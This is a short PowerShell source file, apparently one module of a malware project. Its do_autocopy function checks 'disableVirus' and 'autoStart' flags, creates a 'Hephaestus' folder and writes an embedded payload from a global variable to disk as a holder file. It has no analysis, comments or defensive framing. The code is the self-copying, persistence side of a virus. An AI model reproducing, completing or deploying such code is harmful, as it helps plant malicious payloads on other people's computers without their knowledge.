. ./utils.ps1
. ./consts_body.ps1
. ./consts_autocopy.ps1


function do_autocopy {
    
    if ($server.disableVirus)
    {
        return
    }

    try 
    {
        $holderPath = Get-HolderPath
        $holderFolder = Get-HephaestusFolder  

        if ($server.autoStart -eq $false)
        {
            return
        }

        if (-not (Test-Path $holderFolder)) {
            New-Item -Path $holderFolder -ItemType Directory | Out-Null
        }

        if ($null -ne $global:xholder -and $global:xholder -ne "")
        {
            writedbg "Invoke from internals"
            ExtractEmbedding -inContent $xholder -outFile $holderPath
            return
        }

    } catch {
        writedbg "Error DoAuto"
    }
}